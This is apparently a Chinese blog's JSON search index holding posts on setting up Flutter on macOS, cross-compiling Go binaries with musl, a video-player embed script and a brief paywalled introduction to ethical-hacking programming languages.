Studio Android Studio: 为Flutter提供完整的IDE体验. ","date":"2021-11-18","objectID":"/zh-cn/18-2/:0:0","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 体验","uri":"/zh-cn/18-2/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"创建新应用 选择 File\u003eNew Flutter Project 选择 Flutter application 作为 project 类型, 然后点击 Next 输入项目名称 (如 myapp), 然后点击 Next 点击 Finish 等待Android Studio安装SDK并创建项目. 上述命令创建一个Flutter项目，项目名为myapp，其中包含一个使用Material 组件的简单演示应用程序。 在项目目录中，您应用程序的代码位于 lib/main.dart. ","date":"2021-11-18","objectID":"/zh-cn/18-2/:1:0","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 体验","uri":"/zh-cn/18-2/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"运行应用程序 定位到Android Studio 工具栏: 在 target selector 中, 选择一个运行该应用的Android设备. 如果没有列出可用，请选择 Tools\u003eAndroid\u003eAVD Manager 并在那里创建一个 在工具栏中点击 Run图标, 或者调用菜单项 Run \u003e Run. 如果一切正常, 您应该在您的设备或模拟器上会看到启动的应用程序: ","date":"2021-11-18","objectID":"/zh-cn/18-2/:2:0","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 体验","uri":"/zh-cn/18-2/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"体验热重载 Flutter 可以通过 热重载（hot reload） 实现快速的开发周期，热重载就是无需重启应用程序就能实时加载修改后的代码，并且不会丢失状态（译者语:如果是一个web开发者，那么可以认为这和webpack的热重载是一样的）。简单的对代码进行更改，然后告诉IDE或命令行工具你需要重新加载（点击reload按钮），你就会在你的设备或模拟器上看到更改。 将字符串 'You have pushed the button this many times:' 更改为 'You have clicked the button this many times:' 不要按“Stop”按钮; 让您的应用继续运行。 要查看您的更改, 只需调用 Save All (cmd-s / ctrl-s), 或点击 热重载按钮 (带有闪电⚡️图标的按钮). 你就会立即看到更新后的字符串。 VS Code VS Code: 轻量级编辑器，支持Flutter运行和调试. ","date":"2021-11-18","objectID":"/zh-cn/18-2/:3:0","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 体验","uri":"/zh-cn/18-2/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"创建新的应用 启动 VS Code 调用 View\u003eCommand Palette… 输入 ‘flutter’, 然后选择 ‘Flutter: New Project’ action 输入 Project 名称 (如myapp), 然后按回车键 指定放置项目的位置，然后按蓝色的确定按钮 等待项目创建继续，并显示main.dart文件 上述命令创建一个Flutter项目，项目名为myapp，其中包含一个使用Material 组件的简单的演示应用程序。 在项目目录中，您的应用程序的代码位于 lib/main.dart. ","date":"2021-11-18","objectID":"/zh-cn/18-2/:4:0","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 体验","uri":"/zh-cn/18-2/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"运行应用程序 确保在VS Code的右下角选择了目标设备 按 F5 键或调用Debug\u003eStart Debugging 等待应用程序启动 如果一切正常，在应用程序建成功后，您应该在您的设备或模拟器上看到应用程序: ","date":"2021-11-18","objectID":"/zh-cn/18-2/:5:0","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 体验","uri":"/zh-cn/18-2/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"体验热重载 Flutter 可以通过 热重载（hot reload） 实现快速的开发周期，热重载就是无需重启应用程序就能实时加载修改后的代码，并且不会丢失状态（译者语:如果是一个web开发者，那么可以认为这和webpack的热重载是一样的）。简单的对代码进行更改，然后告诉IDE或命令行工具你需要重新加载（点击reload按钮），你就会在你的设备或模拟器上看到更改。 用你喜欢的编辑器打开文件lib/main.dart 将字符串 'You have pushed the button this many times:' 更改为 'You have clicked the button this many times:' 不要按“停止”按钮; 让您的应用继续运行. 要查看您的更改，请调用 Save (cmd-s / ctrl-s), 或者点击 热重载按钮 (绿色圆形箭头按钮). 你会立即在运行的应用程序中看到更新的字符串 Terminal + 编辑器 Terminal + 编辑器: 您的编辑选择与Flutter的终端工具结合运行和构建 ","date":"2021-11-18","objectID":"/zh-cn/18-2/:6:0","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 体验","uri":"/zh-cn/18-2/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"创建新的应用 使用 flutter create 命令创建一个project: $ flutter create myapp $ cd myapp 上述命令创建一个Flutte让项目，项目名为myapp，其中包含一个使用Material 组件的简单演示应用程序。 在项目目录中，您的应用程序的代码位于 lib/main.dart. ","date":"2021-11-18","objectID":"/zh-cn/18-2/:7:0","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 体验","uri":"/zh-cn/18-2/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"运行应用程序 检查Android设备是否在运行。如果没有显示, 请参照 设置. $ flutter devices 运行 flutter run 命令来运行应用程序: $ flutter run 如果一切正常，在应用程序建成功后，您应该在您的设备或模拟器上看到应用程序: ","date":"2021-11-18","objectID":"/zh-cn/18-2/:8:0","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 体验","uri":"/zh-cn/18-2/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"体验热重载 Flutter 可以通过 热重载（hot reload） 实现快速的开发周期，热重载就是无需重启应用程序就能实时加载修改后的代码，并且不会丢失状态（译者语:如果是一个web开发者，那么可以认为这和webpack的热重载是一样的）。简单的对代码进行更改，然后告诉IDE或命令行工具你需要重新加载（点击reload按钮），你就会在你的设备或模拟器上看到更改。 打开文件lib/main.dart 将字符串 'You have pushed the button this many times:' 更改为 'You have clicked the button this many times:' 不要按“停止”按钮; 让您的应用继续运行. 要查看您的更改，请调用 Save (cmd-s / ctrl-s), 或者点击 热重载按钮 (带有闪电图标的按钮). 你会立即在运行的应用程序中看到更新的字符串 ","date":"2021-11-18","objectID":"/zh-cn/18-2/:9:0","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 体验","uri":"/zh-cn/18-2/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"下一步 让我们通过创建一个小应用来学习一些Flutter的核心的概念。 下一步: 编写您的第一个Flutter应用程序 ","date":"2021-11-18","objectID":"/zh-cn/18-2/:10:0","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 体验","uri":"/zh-cn/18-2/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"起步: 配置编辑器 您可以使用任何文本编辑器与命令行工具来构建Flutter应用程序。 不过，我们建议使用我们的编辑器插件之一，以获得更好的体验。通过我们的编辑器插件，您可以获得代码补全、语法高亮、widget编辑辅助、运行和调试支持等等。 按照下面步骤为Android Studio、IntelliJ或VS Code添加编辑器插件。如果你想使用其他的编辑器， 那没关系，直接跳到 下一步:创建并运行你的第一个应用程序。 Android Studio Android Studio 安装 Android Studio: 为Flutter提供完整的IDE体验 ","date":"2021-11-18","objectID":"/zh-cn/18-1/:0:0","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 配置编辑器","uri":"/zh-cn/18-1/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"安装Android Studio Android Studio, 3.0或更高版本. 或者，您也可以使用IntelliJ： IntelliJ IDEA Community, version 2017.1或更高版本. IntelliJ IDEA Ultimate, version 2017.1 或更高版本. ","date":"2021-11-18","objectID":"/zh-cn/18-1/:0:1","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 配置编辑器","uri":"/zh-cn/18-1/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"安装Flutter和Dart插件 需要安装两个插件: Flutter插件： 支持Flutter开发工作流 (运行、调试、热重载等). Dart插件： 提供代码分析 (输入代码时进行验证、代码补全等). 要安装这些: 启动Android Studio. 打开插件首选项 (Preferences\u003ePlugins on macOS, File\u003eSettings\u003ePlugins on Windows \u0026 Linux). 选择 Browse repositories…, 选择 Flutter 插件并点击 install. 重启Android Studio后插件生效. VS Code ","date":"2021-11-18","objectID":"/zh-cn/18-1/:0:2","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 配置编辑器","uri":"/zh-cn/18-1/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"Visual Studio Code (VS Code) 安装 VS Code: 轻量级编辑器，支持Flutter运行和调试. ","date":"2021-11-18","objectID":"/zh-cn/18-1/:1:0","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 配置编辑器","uri":"/zh-cn/18-1/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"安装 VS Code VS Code, 安装1.20.1或更高版本. ","date":"2021-11-18","objectID":"/zh-cn/18-1/:1:1","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 配置编辑器","uri":"/zh-cn/18-1/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"安装Flutter插件 启动 VS Code 调用 View\u003eCommand Palette… 输入 ‘install’, 然后选择 Extensions: Install Extension action 在搜索框输入 flutter , 在搜索结果列表中选择 ‘Flutter’, 然后点击 Install 选择 ‘OK’ 重新启动 VS Code ","date":"2021-11-18","objectID":"/zh-cn/18-1/:1:2","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 配置编辑器","uri":"/zh-cn/18-1/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"通过Flutter Doctor验证您的设置 调用 View\u003eCommand Palette… 输入 ‘doctor’, 然后选择 ‘Flutter: Run Flutter Doctor’ action 查看“OUTPUT”窗口中的输出是否有问题 ","date":"2021-11-18","objectID":"/zh-cn/18-1/:2:0","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 配置编辑器","uri":"/zh-cn/18-1/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"下一步 让我们来体验一下Flutter：创建第一个项目，运行它，并体验“热重载”. 下一步: 体验 Flutter ","date":"2021-11-18","objectID":"/zh-cn/18-1/:3:0","tags":["MacOS","Flutter","开发","环境","配置"],"title":"起步: 配置编辑器","uri":"/zh-cn/18-1/"},{"categories":["MacOS","Flutter","开发","环境"],"content":"入门: 在macOS上搭建Flutter开发环境 使用镜像 系统要求 获取Flutter SDK 运行 flutter doctor 更新环境变量 编辑器设置 平台设置 iOS 设置 安装 Xcode 设置iOS模拟器 安装到iOS设备 Android设置 安装Android Studio 设置您的Android设备 设置Android模拟器 下一步 ","date":"2021-11-18","objectID":"/zh-cn/18/:0:0","tags":["MacOS","Flutter","开发","环境"],"title":"入门: 在macOS上搭建Flutter开发环境","uri":"/zh-cn/18/"},{"categories":["MacOS","Flutter","开发","环境"],"content":"使用镜像 由于在国内访问Flutter有时可能会受到限制，Flutter官方为中国开发者搭建了临时镜像，大家可以将如下环境变量加入到用户环境变量中： export PUB_HOSTED_URL=https://pub.flutter-io.cn export FLUTTER_STORAGE_BASE_URL=https://storage.flutter-io.cn 注意： 此镜像为临时镜像，并不能保证一直可用，读者可以参考详情请参考 Using Flutter in China 以获得有关镜像服务器的最新动态。 ","date":"2021-11-18","objectID":"/zh-cn/18/:1:0","tags":["MacOS","Flutter","开发","环境"],"title":"入门: 在macOS上搭建Flutter开发环境","uri":"/zh-cn/18/"},{"categories":["MacOS","Flutter","开发","环境"],"content":"系统要求 要安装并运行Flutter，您的开发环境必须满足以下最低要求: 操作系统: macOS (64-bit) 磁盘空间: 700 MB (不包括Xcode或Android Studio的磁盘空间）. 工具 Flutter 依赖下面这些命令行工具. bash, mkdir, rm, git, curl, unzip, which ","date":"2021-11-18","objectID":"/zh-cn/18/:2:0","tags":["MacOS","Flutter","开发","环境"],"title":"入门: 在macOS上搭建Flutter开发环境","uri":"/zh-cn/18/"},{"categories":["MacOS","Flutter","开发","环境"],"content":"获取Flutter SDK 去flutter官网下载其最新可用的安装包，转到下载页 。 注意，Flutter的渠道版本会不停变动，请以Flutter官网为准。另外，在中国大陆地区，要想正常获取安装包列表或下载安装包，可能需要翻墙，读者也可以去Flutter github项目下去下载安装包，转到下载页 。 解压安装包到你想安装的目录，如： cd ~/development unzip ~/Downloads/flutter_macos_v0.5.1-beta.zip 添加flutter相关工具到path中： export PATH=`pwd`/flutter/bin:$PATH 此代码只能暂时针对当前命令行窗口设置PATH环境变量，要想永久将Flutter添加到PATH中请参考下面更新环境变量 部分。 注意： 由于一些flutter命令需要联网获取数据，如果您是在国内访问，由于众所周知的原因，直接访问很可能不会成功。 上面的PUB_HOSTED_URL和FLUTTER_STORAGE_BASE_URL是google为国内开发者搭建的临时镜像。详情请参考 Using Flutter in China 要更新现有版本的Flutter，请参阅升级Flutter。 ","date":"2021-11-18","objectID":"/zh-cn/18/:3:0","tags":["MacOS","Flutter","开发","环境"],"title":"入门: 在macOS上搭建Flutter开发环境","uri":"/zh-cn/18/"},{"categories":["MacOS","Flutter","开发","环境"],"content":"运行 flutter doctor 运行以下命令查看是否需要安装其它依赖项来完成安装： flutter doctor 该命令检查您的环境并在终端窗口中显示报告。Dart SDK已经在捆绑在Flutter里了，没有必要单独安装Dart。 仔细检查命令行输出以获取可能需要安装的其他软件或进一步需要执行的任务（以粗体显示） 例如: [-] Android toolchain - develop for Android devices • Android SDK at /Users/obiwan/Library/Android/sdk ✗ Android SDK is missing command line tools; download from https://goo.gl/XxQghQ • Try re-installing or updating your Android SDK, visit https://flutter.io/setup/#android-setup for detailed instructions. 一般的错误会是xcode或Android Studio版本太低、或者没有ANDROID_HOME环境变量等，请按照提示解决。下面贴一个笔者本机(mac)的环境变量配置，您可以对比修正： export PATH=/Users/用户名/Documents/flutter/flutter/bin:$PATH export ANDROID_HOME=\"/Users/用户名/Documents/android_sdk\" //android sdk目录，替换为你自己的即可 export PATH=${PATH}:${ANDROID_HOME}/tools export PATH=${PATH}:${ANDROID_HOME}/platform-tools export PUB_HOSTED_URL=https://pub.flutter-io.cn export FLUTTER_STORAGE_BASE_URL=https://storage.flutter-io.cn 第一次运行一个flutter命令（如flutter doctor）时，它会下载它自己的依赖项并自行编译。以后再运行就会快得多。 以下各部分介绍如何执行这些任务并完成设置过程。你会看到在flutter doctor输出中， 如果你选择使用IDE，我们提供了，IntelliJ IDEA，Android Studio和VS Code的插件， 请参阅编辑器设置 以了解安装Flutter和Dart插件的步骤。 一旦你安装了任何缺失的依赖，再次运行flutter doctor命令来验证你是否已经正确地设置了。 该flutter工具使用Google Analytics匿名报告功能使用情况统计信息和基本崩溃报告。 这些数据用于帮助改进Flutter工具。Analytics不是一运行或在运行涉及flutter config的任何命令时就发送， 因此您可以在发送任何数据之前退出分析。要禁用报告，请执行flutter config --no-analytics并显示当前设置，然后执行flutter config。 请参阅Google的隐私政策。 ","date":"2021-11-18","objectID":"/zh-cn/18/:3:1","tags":["MacOS","Flutter","开发","环境"],"title":"入门: 在macOS上搭建Flutter开发环境","uri":"/zh-cn/18/"},{"categories":["MacOS","Flutter","开发","环境"],"content":"更新环境变量 您在命令行只能更新当前会话的PATH变量，如Clone Flutter repo所示。 但是，您可能需要的是永久更新此变量，以便您可以运行flutter命令在任何终端会话中。 对于所有终端会话永久修改此变量的步骤是和特定计算机系统相关的。通常，您会在打开新窗口时将设置环境变量的命令添加到执行的文件中。例如 确定您Flutter SDK的目录，您将在步骤3中用到。 打开(或创建) $HOME/.bash_profile. 文件路径和文件名可能在您的机器上不同. 添加以下行并更改[PATH_TO_FLUTTER_GIT_DIRECTORY]为克隆Flutter的git repo的路径: export PUB_HOSTED_URL=https://pub.flutter-io.cn //国内用户需要设置 export FLUTTER_STORAGE_BASE_URL=https://storage.flutter-io.cn //国内用户需要设置 export PATH=PATH_TO_FLUTTER_GIT_DIRECTORY/flutter/bin:$PATH 注意：PATH_TO_FLUTTER_GIT_DIRECTORY 为你flutter的路径，比如“~/document/code” export PATH=~/document/code/flutter/bin:$PATH 运行 source $HOME/.bash_profile 刷新当前终端窗口. 注意: 如果你使用的是zsh，终端启动时 ~/.bash_profile 将不会被加载，解决办法就是修改 ~/.zshrc ，在其中添加：source ~/.bash_profile 5.通过运行flutter/bin命令验证目录是否在已经在PATH中: echo $PATH 更多详细信息，请参阅this StackExchange question. ","date":"2021-11-18","objectID":"/zh-cn/18/:3:2","tags":["MacOS","Flutter","开发","环境"],"title":"入门: 在macOS上搭建Flutter开发环境","uri":"/zh-cn/18/"},{"categories":["MacOS","Flutter","开发","环境"],"content":"编辑器设置 使用 flutter 命令行工具，您可以使用任何编辑器来开发Flutter应用程序。输入flutter help在提示符下查看可用的工具。 我们建议使用我们的插件来获得丰富的IDE体验，支持编辑，运行和调试Flutter应用程序。请参阅编辑器设置了解详细步骤 ","date":"2021-11-18","objectID":"/zh-cn/18/:4:0","tags":["MacOS","Flutter","开发","环境"],"title":"入门: 在macOS上搭建Flutter开发环境","uri":"/zh-cn/18/"},{"categories":["MacOS","Flutter","开发","环境"],"content":"平台设置 macOS支持为iOS和Android开发Flutter应用程序。现在完成两个平台设置步骤中的至少一个，以便能够构建并运行您的第一个Flutter应用程序 ","date":"2021-11-18","objectID":"/zh-cn/18/:5:0","tags":["MacOS","Flutter","开发","环境"],"title":"入门: 在macOS上搭建Flutter开发环境","uri":"/zh-cn/18/"},{"categories":["MacOS","Flutter","开发","环境"],"content":"iOS 设置 ","date":"2021-11-18","objectID":"/zh-cn/18/:6:0","tags":["MacOS","Flutter","开发","环境"],"title":"入门: 在macOS上搭建Flutter开发环境","uri":"/zh-cn/18/"},{"categories":["MacOS","Flutter","开发","环境"],"content":"安装 Xcode 要为iOS开发Flutter应用程序，您需要Xcode 7.2或更高版本: 安装Xcode 7.2或更新版本(通过链接下载或苹果应用商店). 配置Xcode命令行工具以使用新安装的Xcode版本 sudo xcode-select --switch /Applications/Xcode.app/Contents/Developer 对于大多数情况，当您想要使用最新版本的Xcode时，这是正确的路径。如果您需要使用不同的版本，请指定相应路径。 确保Xcode许可协议是通过打开一次Xcode或通过命令sudo xcodebuild -license同意过了. 使用Xcode，您可以在iOS设备或模拟器上运行Flutter应用程序。 ","date":"2021-11-18","objectID":"/zh-cn/18/:6:1","tags":["MacOS","Flutter","开发","环境"],"title":"入门: 在macOS上搭建Flutter开发环境","uri":"/zh-cn/18/"},{"categories":["MacOS","Flutter","开发","环境"],"content":"设置iOS模拟器 要准备在iOS模拟器上运行并测试您的Flutter应用，请按以下步骤操作： 在Mac上，通过Spotlight或使用以下命令找到模拟器: open -a Simulator 通过检查模拟器 硬件\u003e设备 菜单中的设置，确保您的模拟器正在使用64位设备（iPhone 5s或更高版本）. 根据您的开发机器的屏幕大小，模拟的高清屏iOS设备可能会使您的屏幕溢出。在模拟器的 Window\u003e Scale 菜单下设置设备比例 运行 flutter run启动您的应用. ","date":"2021-11-18","objectID":"/zh-cn/18/:6:2","tags":["MacOS","Flutter","开发","环境"],"title":"入门: 在macOS上搭建Flutter开发环境","uri":"/zh-cn/18/"},{"categories":["MacOS","Flutter","开发","环境"],"content":"安装到iOS设备 要将您的Flutter应用安装到iOS真机设备，您需要一些额外的工具和一个Apple帐户，您还需要在Xcode中进行设置。 安装 homebrew （如果已经安装了brew,跳过此步骤）. 打开终端并运行这些命令来安装用于将Flutter应用安装到iOS设备的工具 brew update brew install --HEAD libimobiledevice brew install ideviceinstaller ios-deploy cocoapods pod setup 如果这些命令中的任何一个失败并出现错误，请运行brew doctor并按照说明解决问题. 遵循Xcode签名流程来配置您的项目: 在你Flutter项目目录中通过 open ios/Runner.xcworkspace 打开默认的Xcode workspace. 在Xcode中，选择导航面板左侧中的Runner项目 在Runner target设置页面中，确保在 常规\u003e签名\u003e团队 下选择了您的开发团队。当您选择一个团队时，Xcode会创建并下载开发证书，向您的设备注册您的帐户，并创建和下载配置文件（如果需要） 要开始您的第一个iOS开发项目，您可能需要使用您的Apple ID登录Xcode. 任何Apple ID都支持开发和测试。需要注册Apple开发者计划才能将您的应用分发到App Store. 查看differences between Apple membership types. 当您第一次attach真机设备进行iOS开发时，您需要同时信任你的Mac和该设备上的开发证书。首次将iOS设备连接到Mac时,请在对话框中选择 Trust。 然后，转到iOS设备上的设置应用程序，选择 常规\u003e设备管理 并信任您的证书。 如果Xcode中的自动签名失败，请验证项目的 General \u003e Identity \u003e Bundle Identifier 值是否唯一. 运行启动您的应用程序 flutter run. ","date":"2021-11-18","objectID":"/zh-cn/18/:6:3","tags":["MacOS","Flutter","开发","环境"],"title":"入门: 在macOS上搭建Flutter开发环境","uri":"/zh-cn/18/"},{"categories":["MacOS","Flutter","开发","环境"],"content":"Android设置 ","date":"2021-11-18","objectID":"/zh-cn/18/:7:0","tags":["MacOS","Flutter","开发","环境"],"title":"入门: 在macOS上搭建Flutter开发环境","uri":"/zh-cn/18/"},{"categories":["MacOS","Flutter","开发","环境"],"content":"安装Android Studio 要为Android开发Flutter应用，您可以使用Mac，Windows或Linux（64位）机器. Flutter需要安装和配置Android Studio: 下载并安装 Android Studio. 启动Android Studio，然后执行“Android Studio安装向导”。这将安装最新的Android SDK，Android SDK平台工具和Android SDK构建工具，这是Flutter为Android开发时所必需的 ","date":"2021-11-18","objectID":"/zh-cn/18/:7:1","tags":["MacOS","Flutter","开发","环境"],"title":"入门: 在macOS上搭建Flutter开发环境","uri":"/zh-cn/18/"},{"categories":["MacOS","Flutter","开发","环境"],"content":"设置您的Android设备 要准备在Android设备上运行并测试您的Flutter应用，您需要安装Android 4.1（API level 16）或更高版本的Android设备. 在您的设备上启用 开发人员选项 和 USB调试 。详细说明可在Android文档中找到。 使用USB将手机插入电脑。如果您的设备出现提示，请授权您的计算机访问您的设备。 在终端中，运行 flutter devices 命令以验证Flutter识别您连接的Android设备。 运行启动您的应用程序 flutter run。 默认情况下，Flutter使用的Android SDK版本是基于你的 adb 工具版本。 如果您想让Flutter使用不同版本的Android SDK，则必须将该 ANDROID_HOME 环境变量设置为SDK安装目录。 ","date":"2021-11-18","objectID":"/zh-cn/18/:7:2","tags":["MacOS","Flutter","开发","环境"],"title":"入门: 在macOS上搭建Flutter开发环境","uri":"/zh-cn/18/"},{"categories":["MacOS","Flutter","开发","环境"],"content":"设置Android模拟器 要准备在Android模拟器上运行并测试您的Flutter应用，请按照以下步骤操作： 在您的机器上启用 VM acceleration . 启动 Android Studio\u003eTools\u003eAndroid\u003eAVD Manager 并选择 Create Virtual Device. 选择一个设备并选择 Next。 为要模拟的Android版本选择一个或多个系统映像，然后选择 Next. 建议使用 x86 或 x86_64 image . 在 Emulated Performance下, 选择 Hardware - GLES 2.0 以启用 硬件加速. 验证AVD配置是否正确，然后选择 Finish。 有关上述步骤的详细信息，请参阅 Managing AVDs. 在 Android Virtual Device Manager中, 点击工具栏的 Run。模拟器启动并显示所选操作系统版本或设备的启动画面. 运行 flutter run 启动您的设备. 连接的设备名是 Android SDK built for \u003cplatform\u003e,其中 platform 是芯片系列, 如 x86. ","date":"2021-11-18","objectID":"/zh-cn/18/:7:3","tags":["MacOS","Flutter","开发","环境"],"title":"入门: 在macOS上搭建Flutter开发环境","uri":"/zh-cn/18/"},{"categories":["MacOS","Flutter","开发","环境"],"content":"下一步 下一步: 配置编辑器 ","date":"2021-11-18","objectID":"/zh-cn/18/:8:0","tags":["MacOS","Flutter","开发","环境"],"title":"入门: 在macOS上搭建Flutter开发环境","uri":"/zh-cn/18/"},{"categories":["Go","编译","交叉","问题"],"content":"使用go语言进行交叉编译的时候遇到的一些问题 最近一直在搞go的开发，开发的程序会部署在一套hadoop集群中，我本地的开发环境是使用macos进行代码编写，然后放到virtualbox中的hadoop集群去运行，而vbox中的机器又是linux。 这就导致我需要使用交叉编译在macos上编译出linux的binary，再去虚拟机中测试，对于go来说默认就支持交叉编译，毕竟方便的多环境编译也是go的优势之一，只需要通过如下配置： CGO_ENABLED=1 go build -o BIN_NAME CGO_ENABLED=1 GOOS=linux GOARCH=amd64 go build -o BIN_NAME 如上第一行是编译当前机器的二进制，第二行代码是编译linux的二进制，不过我在编译的时候碰到一个问题： linux_syscall.c:67:13: error: implicit declaration of function 'setresgid' is invalid in C99 [-Werror,-Wimplicit-function-declaration] linux_syscall.c:67:13: note: did you mean 'setregid'? /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/unistd.h:593:6: note: 'setregid' declared here linux_syscall.c:73:13: error: implicit declaration of function 'setresuid' is invalid in C99 [-Werror,-Wimplicit-function-declaration] linux_syscall.c:73:13: note: did you mean 'setreuid'? /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/unistd.h:595:6: note: 'setreuid' declared here 这是因为os本身系统库不兼容的问题，首先因为我是在macos上编译linux的版本，所以需要安装： brew install FiloSottile/musl-cross/musl-cross 如果你是在macos上编译运行在win下的exe，那么需要安装： brew install mingw-w64 ==\u003e Downloading https://homebrew.bintray.com/bottles/gmp-6.2.1.big_sur.bottle.tar.gz ==\u003e Downloading from https://d29vzk4ow07wi7.cloudfront.net/6a44705536f25c4b9f8547d44d129ae3b3657755039966ad2b86b821e187c32c?response-content-dispositio 同时编译的参数也需要调整如下： CGO_ENABLED=1 GOOS=linux GOARCH=amd64 CC=x86_64-linux-musl-gcc CXX=x86_64-linux-musl-g++ go build -o BIN_NAME 这样就能编译出需要的可以运行的二进制了，不过在运行的时候，linux可能会遇到这个错误： /lib/ld-musl-x86_64.so.1: bad ELF interpreter: No such file or directory 这是因为linux没有安装musl的支持，如下安装： wget https://copr.fedorainfracloud.org/coprs/ngompa/musl-libc/repo/epel-7/ngompa-musl-libc-epel-7.repo -O /etc/yum.repos.d/ngompa-musl-libc-epel-7.repo yum install -y musl-libc-static musl是一个os级别的系统库，像glibc是大家见的最多的，musl也是其中之一，各有所长，上面编译出的是使用的musl接口的二进制，因此需要安装支持，其他几类的介绍如下： Glibc glibc = GNU C Library 是GNU项（GNU Project）目，所实现的 C语言标准库（C standard library）。 目前，常见的桌面和服务器中的GNU/Linux类的系统中，都是用的这套C语言标准库。 其实现了常见的C库的函数，支持很多种系统平台，功能很全，但是也相对比较臃肿和庞大。 uClibc 一个小型的C语言标准库，主要用于嵌入式。 其最开始设计用于uClinux（注：uClinux不支持MMU），因此比较适用于微处理器中。 对应的，此处的u意思是μ，Micro，微小的意思。 uClibc的特点： (1)uClibc比glibc要小很多。 (2)uClibc是独立的，为了应用于嵌入式系统中，完全重新实现出来的，和glibc在源码结构和二进制上，都不兼容。 EGLIBC EGLIBC = Embedded GLIBC EGLIBC是，（后来）glibc的原创作组织FSF所（新）推出的，glibc的一种变体，目的在于将glibc用于嵌入式系统。 EGLIBC的目标是： (1)保持源码和二进制级别的兼容于Glibc 源代码架构和ABI层面兼容 如果真正实现了这个目标，那意味着，你之前用glibc编译的程序，可以直接用eglibc替换，而不需要重新编译。 这样就可以复用之前的很多的程序了。 (2)降低(内存)资源占用/消耗 (3)使更多的模块为可配置的（以实现按需裁剪不需要的模块） (4)提高对于交叉编译(cross-compilation)和交叉测试(cross-testing)的支持 Eglibc的最主要特点就是可配置，这样对于嵌入式系统中，你所不需要的模块，比如NIS，locale等，就可以裁剪掉，不把其编译到库中，使得降低生成的库的大小了。 Musl-libc C语言标准库Musl-libc项目发布了1.0版。Musl是一个轻量级的C标准库，设计作为GNU C library (glibc)、 uClibc或Android Bionic的替代用于嵌入式操作系统和移动设备。它遵循POSIX 2008规格和 C99 标准，采用MIT许可证授权，使用Musl的Linux发行版和项目包括sabotage，bootstrap-linux，LightCube OS等等。 备注一个备忘录，因为我之前一直是macos的低版本升级上来的，所以默认使用的是bash shell，不过目前比较推荐的是zsh，macos内置的也是zsh，插件也非常丰富，可以使用如下命令去自由切换： 查看shell类型 可以执行命令echo $SHELL，先查看终端类型。 bash: /bin/bash zsh: /bin/zsh shell类型切换命令 切换到bash输入命令：chsh -s /bin/bash 切换到zsh输入命令：chsh -s /bin/zsh 当然可以修改系统级别的，也可以修改当前session级别的配置。 ","date":"2021-11-17","objectID":"/zh-cn/17-1/:0:0","tags":["Go","编译","交叉","问题"],"title":"使用go语言进行交叉编译的时候遇到的一些问题","uri":"/zh-cn/17-1/"},{"categories":[],"content":" .dplayer { position: relative; width: 100%; height: auto; margin: 3% auto; text-align: center; } function loadDPlayer(){ let dp = new DPlayer({ container: document.getElementById(\"highline\"), autoplay: \"true\", theme: \"#b7daff\", loop: \"true\", lang: \"zh-cn\", screenshot: true , hotkey: true , preload: \"none\", logo: \"\", volume: 0.7 , mutex: true , video: { url: \"https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/Video/1.mp4\", pic: \"\", thumbnails: \"\", type: \"auto\", }, subtitle: { url: \"\", type: \"webvtt\", fontSize: \"20px\", bottom: \"10%\", color: \"#b7daff\", }, }); } document.addEventListener('DOMContentLoaded', loadDPlayer, !1); ","date":"2021-11-17","objectID":"/zh-cn/17/:0:0","tags":[],"title":"没有标题","uri":"/zh-cn/17/"},{"categories":["黑客","编程语言"],"content":"此文为加密收费内容添加我微信支付后可看: 前 5 种道德黑客编程语言 每个人都知道黑客攻击关于破坏系统和政府数据的 IT 魔鬼的可怕电影很受欢迎， 似乎是真实的。 那些认为这种不真实的阴谋看起来像外星人和太空入侵的人与现实相去甚远。商业巨头为 IT 安全支付了数十亿美元，但无法 100% 确定它们是安全的。 与此同时，道德黑客似乎反对提供敲诈勒索和勒索的标准黑客行为。那些想尽最大努力发现 IT 安全弱点的程序员可以正式尝试自己，如果他们成功了，可以赚钱。 像Facebook、谷歌和其他公司这样的公司为来自世界各地的白人黑客提供特别基金，他们发现错误和问题并分享，而不是将它们用作压力工具。所以，如果你觉得这个IT行业是有趣和令人兴奋的你，让我们发现语言，适合它最好的。 ","date":"2021-11-16","objectID":"/zh-cn/16-1/:0:0","tags":["黑客","编程语言"],"title":"前 5 种道德黑客编程语言","uri":"/zh-cn/16-1/"},{"categories":["黑客","编程语言"],"content":"道德黑客的五种最佳编程语言 